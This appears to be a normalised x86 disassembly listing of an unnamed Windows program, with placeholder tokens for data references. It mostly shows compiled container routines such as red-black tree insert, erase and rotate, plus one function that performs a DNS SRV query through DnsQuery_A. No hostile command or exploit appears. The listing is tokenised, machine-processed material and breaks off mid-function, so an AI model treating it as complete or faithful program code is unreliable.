call sub_40415f
push r--data
lea ecx [ esp + 0x704 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x75
mov edi [ esi ]
lea esi [ esp + 0x28 ]
add edi 0x10
call sub_40f2a9
mov ecx [ esp + 0x1c ]
add eax 0x38
push eax
lea eax [ esp + 0x704 ]
push eax
call [ edi ]
push ebx
push 0x1
lea ecx [ esp + 0x708 ]
mov [ esp + 0x868 ] 0x6d
call sub_40415f
call sub_408d54
jmp r-xdata
sub_412965
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x74 ]
lea edi [ esi + 0x44 ]
push eax
lea ebx [ esp + 0x24 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] edi
call sub_40f491
mov eax [ edi + 0x18 ]
mov [ esp + 0x1c ] eax
mov eax [ edi ]
lea edi [ esp + 0x18 ]
mov esi ebx
mov [ esp + 0x18 ] eax
call sub_40f543
test al al
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x18 ]
mov [ esp + 0x2c ] ecx
mov ecx [ eax ]
mov [ esp + 0x28 ] ecx
lea ecx [ esp + 0x28 ]
mov [ esp + 0x10 ] ecx
mov ebx ecx
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x10 ]
add ecx 0xc
call sub_405664
test al al
jne r-xdata
pop edi
pop esi
xor al al
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x68 ]
cmp eax 0x4
je r-xdata
mov eax [ esp + 0x14 ]
mov [ esp + 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x0
je r-xdata
cmp eax 0x8
jne r-xdata
mov ecx [ ebx ]
mov [ esp + 0x18 ] ecx
mov ecx [ ebx + 0x4 ]
mov [ esp + 0x1c ] ecx
mov ecx [ eax + 0x18 ]
mov eax [ eax ]
lea edi [ esp + 0x30 ]
lea esi [ esp + 0x18 ]
mov [ esp + 0x34 ] ecx
mov [ esp + 0x30 ] eax
call sub_40f543
test al al
jne r-xdata
lea esi [ esp + 0x18 ]
call sub_40f2d4
mov ebx [ eax + 0x1c ]
mov edi [ ebx ]
add edi 0x4
dec eax
jne r-xdata
push [ ebx + 0x4 ]
lea eax [ esp + 0x34 ]
push [ ebx ]
push eax
push [ esp + 0x20 ]
call sub_412e71
call sub_40f2d4
mov eax [ eax + 0x1c ]
mov edi [ eax ]
mov [ esp + 0x10 ] eax
add edi 0xc
call sub_40f2d4
push [ eax + 0x20 ]
mov ecx [ esp + 0x14 ]
push [ ebp + 0x8 ]
call [ edi ]
jmp r-xdata
lea esi [ esp + 0x18 ]
call sub_40f2d4
mov ebx [ eax + 0x1c ]
mov edi [ ebx ]
add edi 0x8
jmp r-xdata
lea esi [ esp + 0x18 ]
call sub_40f2d4
push [ eax + 0x20 ]
mov ecx ebx
push [ ebp + 0x8 ]
call [ edi ]
mov ebx [ esp + 0x10 ]
sub_412aae
push 0xffffffff
push 0x0
push [ esp + 0xc ]
lea ecx [ esi + 0xbc ]
call sub_40400a
push 0xffffffff
push 0x0
push rw-data
lea ecx [ esi + 0xd8 ]
call sub_40400a
push 0xffffffff
push 0x0
push [ esp + 0x10 ]
lea ecx [ esi + 0xf4 ]
call sub_40400a
retn 0x8
sub_412b3c
push 0x4c
mov eax sub_43b016
call sub_425dad
mov ebx [ ebp + 0x14 ]
cmp [ ebx + 0x45 ] 0x0
je r-xdata
lea esi [ ebp + 0x10 ]
call sub_41325d
mov edx [ ebx ]
cmp [ edx + 0x45 ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_401065
push r--data
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x58 ] r--data
call sub_42597b
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
lea ecx [ eax + 0x8 ]
mov edi [ ecx ]
cmp eax ebx
jne r-xdata
mov edi edx
jmp r-xdata
cmp [ edi + 0x45 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ ebx ]
mov [ eax ] edx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x18 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x45 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov edx [ ebx + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebx + 0x8 ]
mov [ ecx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x18 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov edx [ ecx + 0x18 ]
cmp [ edx ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x18 ]
cmp [ edx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x45 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ eax + 0x4 ] ecx
lea ecx [ ebx + 0x44 ]
add eax 0x44
cmp eax ecx
je r-xdata
cmp [ ebx + 0x44 ] 0x1
jne r-xdata
cmp [ edi + 0x45 ] 0x0
je r-xdata
mov eax [ edi ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
mov dl [ eax ]
mov [ ebp - 0x11 ] dl
mov dl [ ecx ]
mov [ eax ] dl
mov al [ ebp - 0x11 ]
mov [ ecx ] al
lea edi [ ebx + 0xc ]
call sub_413117
push ebx
call sub_42412e
mov eax [ ebp + 0x8 ]
pop ecx
mov ecx [ eax + 0x1c ]
test ecx ecx
jbe r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov [ edx ] ecx
mov edx [ eax ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x14 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
call sub_425e4c
retn 0x10
dec ecx
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
cmp [ eax + 0x45 ] 0x0
je r-xdata
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ edi + 0x44 ] 0x1
jne r-xdata
jmp r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov [ edi + 0x44 ] 0x1
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x44 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x44 ] 0x0
jne r-xdata
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x44 ] 0x1
mov ecx esi
mov [ esi + 0x44 ] 0x0
call sub_405491
mov ecx [ esi ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x44 ] 0x1
mov ecx esi
mov [ esi + 0x44 ] 0x0
call sub_413175
mov ecx [ esi + 0x8 ]
mov edi esi
mov esi [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x44 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x44 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x44 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x44 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x44 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x44 ] 0x1
je r-xdata
mov al [ esi + 0x44 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x44 ] al
mov [ esi + 0x44 ] 0x1
mov eax [ ecx ]
mov ecx esi
mov [ eax + 0x44 ] 0x1
call sub_405491
mov eax [ ecx + 0x8 ]
push [ ebp + 0x8 ]
mov [ eax + 0x44 ] 0x1
mov [ ecx + 0x44 ] 0x0
call sub_413175
mov ecx [ esi ]
mov [ ecx + 0x44 ] 0x0
mov al [ esi + 0x44 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x44 ] al
mov [ esi + 0x44 ] 0x1
mov eax [ ecx + 0x8 ]
mov ecx esi
mov [ eax + 0x44 ] 0x1
call sub_413175
jmp r-xdata
mov eax [ ecx ]
push [ ebp + 0x8 ]
mov [ eax + 0x44 ] 0x1
mov [ ecx + 0x44 ] 0x0
call sub_405491
mov ecx [ esi + 0x8 ]
sub_412dde
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
lea ebx [ ebp - 0xc ]
call sub_413135
mov eax [ edi + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
lea edi [ ebp - 0x14 ]
mov esi ebx
mov [ ebp - 0x14 ] eax
call sub_40f543
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
add ecx 0xc
call sub_405664
test al al
jne r-xdata
mov ecx ebx
jmp r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
pop edi
pop esi
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0xc
sub_412e71
push 0x4c
mov eax sub_43b016
call sub_425dad
mov ebx [ ebp + 0x14 ]
cmp [ ebx + 0x31 ] 0x0
je r-xdata
lea esi [ ebp + 0x10 ]
call sub_4132aa
mov edx [ ebx ]
cmp [ edx + 0x31 ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_401065
push r--data
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x58 ] r--data
call sub_42597b
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
lea ecx [ eax + 0x8 ]
mov edi [ ecx ]
cmp eax ebx
jne r-xdata
mov edi edx
jmp r-xdata
cmp [ edi + 0x31 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ ebx ]
mov [ eax ] edx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x18 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x31 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov edx [ ebx + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebx + 0x8 ]
mov [ ecx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x18 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov edx [ ecx + 0x18 ]
cmp [ edx ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x18 ]
cmp [ edx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x31 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ eax + 0x4 ] ecx
lea ecx [ ebx + 0x30 ]
add eax 0x30
cmp eax ecx
je r-xdata
cmp [ ebx + 0x30 ] 0x1
jne r-xdata
cmp [ edi + 0x31 ] 0x0
je r-xdata
mov eax [ edi ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
mov dl [ eax ]
mov [ ebp - 0x11 ] dl
mov dl [ ecx ]
mov [ eax ] dl
mov al [ ebp - 0x11 ]
mov [ ecx ] al
push 0x0
push 0x1
lea ecx [ ebx + 0xc ]
call sub_40415f
push ebx
call sub_42412e
mov eax [ ebp + 0x8 ]
pop ecx
mov ecx [ eax + 0x1c ]
test ecx ecx
jbe r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov [ edx ] ecx
mov edx [ eax ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x14 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
call sub_425e4c
retn 0x10
dec ecx
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ edi + 0x30 ] 0x1
jne r-xdata
jmp r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov [ edi + 0x30 ] 0x1
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x30 ] 0x1
mov ecx esi
mov [ esi + 0x30 ] 0x0
call sub_40f4d1
mov ecx [ esi ]
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x30 ] 0x1
mov ecx esi
mov [ esi + 0x30 ] 0x0
call sub_4131e9
mov ecx [ esi + 0x8 ]
mov edi esi
mov esi [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x30 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x30 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x30 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x30 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x30 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x30 ] 0x1
je r-xdata
mov al [ esi + 0x30 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x30 ] al
mov [ esi + 0x30 ] 0x1
mov eax [ ecx ]
mov ecx esi
mov [ eax + 0x30 ] 0x1
call sub_40f4d1
mov eax [ ecx + 0x8 ]
push [ ebp + 0x8 ]
mov [ eax + 0x30 ] 0x1
mov [ ecx + 0x30 ] 0x0
call sub_4131e9
mov ecx [ esi ]
mov [ ecx + 0x30 ] 0x0
mov al [ esi + 0x30 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x30 ] al
mov [ esi + 0x30 ] 0x1
mov eax [ ecx + 0x8 ]
mov ecx esi
mov [ eax + 0x30 ] 0x1
call sub_4131e9
jmp r-xdata
mov eax [ ecx ]
push [ ebp + 0x8 ]
mov [ eax + 0x30 ] 0x1
mov [ ecx + 0x30 ] 0x0
call sub_40f4d1
mov ecx [ esi + 0x8 ]
sub_413135
push ebp
mov ebp esp
push ecx
mov eax [ edi + 0x18 ]
push esi
mov esi [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ esi + 0x45 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ esi + 0xc ]
call sub_405664
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ edi ]
mov [ ebx ] eax
mov eax ebx
pop esi
leave
retn 0x4
mov [ ebp - 0x4 ] esi
mov esi [ esi ]
mov esi [ esi + 0x8 ]
jmp r-xdata
sub_413175
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x45 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ edx ] eax
jmp r-xdata
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_4131b5
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
mov edx [ eax ]
push eax
push ecx
push edx
push ecx
lea eax [ esp + 0x10 ]
push eax
mov eax esi
call sub_4132f7
push [ esi + 0x18 ]
call sub_42412e
and [ esi + 0x18 ] 0x0
and [ esi + 0x1c ] 0x0
pop ecx
mov esp ebp
pop ebp
retn
sub_4131e9
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x31 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ edx ] eax
jmp r-xdata
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_413229
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
mov edx [ eax ]
push eax
push ecx
push edx
push ecx
lea eax [ esp + 0x10 ]
push eax
mov eax esi
call sub_4133ad
push [ esi + 0x18 ]
call sub_42412e
and [ esi + 0x18 ] 0x0
and [ esi + 0x1c ] 0x0
pop ecx
mov esp ebp
pop ebp
retn
sub_41325d
push ebx
xor ebx ebx
cmp [ esi ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x45 ] bl
je r-xdata
call sub_423d5c
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x45 ] bl
jne r-xdata
call sub_423d5c
jmp r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x45 ] bl
je r-xdata
jmp r-xdata
mov eax esi
pop ebx
retn
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov eax [ ecx ]
cmp [ eax + 0x45 ] bl
je r-xdata
mov [ esi + 0x4 ] eax
mov ecx eax
mov [ esi + 0x4 ] ecx
jmp r-xdata
sub_4132aa
push ebx
xor ebx ebx
cmp [ esi ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x31 ] bl
je r-xdata
call sub_423d5c
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x31 ] bl
jne r-xdata
call sub_423d5c
jmp r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x31 ] bl
je r-xdata
jmp r-xdata
mov eax esi
pop ebx
retn
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov eax [ ecx ]
cmp [ eax + 0x31 ] bl
je r-xdata
mov [ esi + 0x4 ] eax
mov ecx eax
mov [ esi + 0x4 ] ecx
jmp r-xdata
sub_4132f7
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
mov eax [ eax ]
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebx ]
push edi
lea edi [ ebp - 0xc ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
call sub_40f543
test al al
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_40f543
test al al
je r-xdata
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx ]
lea edi [ ebp - 0xc ]
lea esi [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
call sub_40f543
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
call sub_41325d
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push eax
push ebx
call sub_412b3c
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov ebx [ ebx ]
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov eax [ ebx + 0x18 ]
push [ eax + 0x4 ]
mov ecx ebx
call sub_4134ed
mov eax [ ebx + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ ebx + 0x18 ]
and [ ebx + 0x1c ] 0x0
mov [ eax ] eax
mov eax [ ebx + 0x18 ]
mov [ eax + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebx ]
mov [ eax ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_4133ad
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
mov eax [ eax ]
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebx ]
push edi
lea edi [ ebp - 0xc ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
call sub_40f543
test al al
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_40f543
test al al
je r-xdata
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx ]
lea edi [ ebp - 0xc ]
lea esi [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
call sub_40f543
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
call sub_4132aa
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push eax
push ebx
call sub_412e71
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov ebx [ ebx ]
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov eax [ ebx + 0x18 ]
push [ eax + 0x4 ]
mov ecx ebx
call sub_413529
mov eax [ ebx + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ ebx + 0x18 ]
and [ ebx + 0x1c ] 0x0
mov [ eax ] eax
mov eax [ ebx + 0x18 ]
mov [ eax + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebx ]
mov [ eax ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_413463
mov eax [ esi + 0x14 ]
mov ecx [ eax ]
mov [ eax ] eax
mov eax [ esi + 0x14 ]
mov [ eax + 0x4 ] eax
and [ esi + 0x18 ] 0x0
cmp ecx [ esi + 0x14 ]
je r-xdata
push [ esi + 0x14 ]
call sub_42412e
and [ esi + 0x14 ] 0x0
pop ecx
retn
push edi
mov edi [ ecx ]
push ecx
call sub_42412e
pop ecx
mov ecx edi
cmp edi [ esi + 0x14 ]
jne r-xdata
pop edi
sub_413499
push 0x48
call sub_4246c6
xor edx edx
pop ecx
cmp eax edx
je r-xdata
lea ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
mov [ eax ] edx
lea ecx [ eax + 0x8 ]
cmp ecx edx
je r-xdata
mov [ ecx ] edx
mov [ eax + 0x44 ] 0x1
mov [ eax + 0x45 ] dl
retn
mov [ ecx ] edx
sub_4134c3
push 0x34
call sub_4246c6
xor edx edx
pop ecx
cmp eax edx
je r-xdata
lea ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
mov [ eax ] edx
lea ecx [ eax + 0x8 ]
cmp ecx edx
je r-xdata
mov [ ecx ] edx
mov [ eax + 0x30 ] 0x1
mov [ eax + 0x31 ] dl
retn
mov [ ecx ] edx
sub_4134ed
push ebx
mov ebx [ esp + 0x8 ]
cmp [ ebx + 0x45 ] 0x0
push ebp
push esi
mov ebp ecx
mov esi ebx
jne r-xdata
pop esi
pop ebp
pop ebx
retn 0x4
push edi
push [ esi + 0x8 ]
mov ecx ebp
call sub_4134ed
mov esi [ esi ]
lea edi [ ebx + 0xc ]
call sub_413117
push ebx
call sub_42412e
cmp [ esi + 0x45 ] 0x0
pop ecx
mov ebx esi
je r-xdata
pop edi
sub_413529
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi + 0x31 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
push [ esi + 0x8 ]
mov ecx ebx
call sub_413529
mov esi [ esi ]
push 0x0
push 0x1
lea ecx [ edi + 0xc ]
call sub_40415f
push edi
call sub_42412e
cmp [ esi + 0x31 ] 0x0
pop ecx
mov edi esi
je r-xdata
sub_413567
push 0xd0
mov eax sub_43cfa8
call sub_425e16
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0xc ]
push eax
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x38 ] ecx
mov ecx [ ebp + 0x10 ]
lea eax [ ebp - 0xdc ]
mov ebx edx
push r--data
push eax
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] edi
call sub_40f984
add esp 0xc
push r--data
push eax
xor esi esi
lea eax [ ebp - 0xa4 ]
inc esi
push eax
mov [ ebp - 0x4 ] esi
call sub_40f9cf
add esp 0xc
push [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x2
push eax
lea eax [ ebp - 0x88 ]
push eax
call sub_40fa15
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0xc0 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_40f9cf
add esp 0xc
push [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x4
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_40fa15
add esp 0xc
push edi
push esi
lea ecx [ ebp - 0xc0 ]
call sub_40415f
push edi
push esi
lea ecx [ ebp - 0x88 ]
call sub_40415f
push edi
push esi
lea ecx [ ebp - 0xa4 ]
call sub_40415f
push edi
push esi
lea ecx [ ebp - 0xdc ]
mov [ ebp - 0x4 ] 0x9
call sub_40415f
push ebx
call sub_413bc5
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x40 ] esi
jae r-xdata
push edi
lea ecx [ ebp - 0x3c ]
push ecx
push edi
push edi
push 0x21
push eax
call DnsQuery_A
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x44 ]
mov edi [ ebp - 0x38 ]
lea eax [ ebp - 0x6c ]
push eax
call sub_413722
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x4 ] 0xb
cmp ebx edi
je r-xdata
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] eax
jmp r-xdata
lea eax [ ebp - 0x6c ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_40fb35
xor edi edi
mov eax [ ebx + 0x18 ]
mov ecx [ ebx ]
mov edx [ eax ]
push eax
push ecx
push edx
push ecx
lea eax [ ebp - 0x48 ]
push eax
mov eax ebx
call sub_40fb91
mov eax edi
mov ecx ebx
call sub_413e49
cmp [ eax + 0x8 ] 0x21
jne r-xdata
mov eax [ eax ]
mov [ ebp - 0x34 ] eax
cmp eax edi
jne r-xdata
push [ eax + 0x18 ]
lea ecx [ ebp - 0x68 ]
call sub_403dc1
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0xa
movzx edi [ eax + 0x20 ]
lea eax [ ebp - 0x68 ]
push eax
call sub_413bfb
push 0x0
push esi
lea ecx [ ebp - 0x68 ]
mov [ eax ] edi
mov [ ebp - 0x4 ] 0x9
call sub_40415f
mov eax [ ebp - 0x34 ]
xor edi edi
mov eax [ ebp - 0x34 ]
push esi
push [ ebp - 0x3c ]
call DnsFree
cmp [ ebx + 0x1c ] edi
jne r-xdata
push edi
push esi
lea ecx [ ebp - 0x30 ]
call sub_40415f
mov eax ebx
call sub_425e60
retn
sub_413722
push 0x3c
